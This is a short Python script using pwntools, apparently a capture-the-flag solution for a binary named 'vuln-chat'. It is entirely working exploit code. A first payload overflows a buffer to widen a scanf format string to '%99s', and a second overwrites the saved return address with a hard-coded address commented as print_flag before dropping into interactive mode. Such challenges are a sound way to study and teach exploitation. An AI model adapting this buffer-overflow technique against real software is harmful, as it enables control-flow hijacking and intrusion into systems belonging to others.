from pwn import *

# Establish the target process
target = process('./vuln-chat')

# print(the initial text
print(target.recvuntil("username: "))

# Form the first payload to overwrite the scanf format string
payload0 = b"0"*0x14 + b"%99s" # Overwrite it with "%99s"

# Send the payload with a newline character
target.sendline(payload0)

# print(the text up to the second scanf call
print(target.recvuntil("I know I can trust you?"))

# From the second payload to overwrite the return address
payload1 = b"1"*0x31 + p32(0x804856b) # Address of the print_flag function

# Send the second payload with a newline character
target.sendline(payload1)

# Drop to an interactive shell to view the rest of the input
target.interactive()

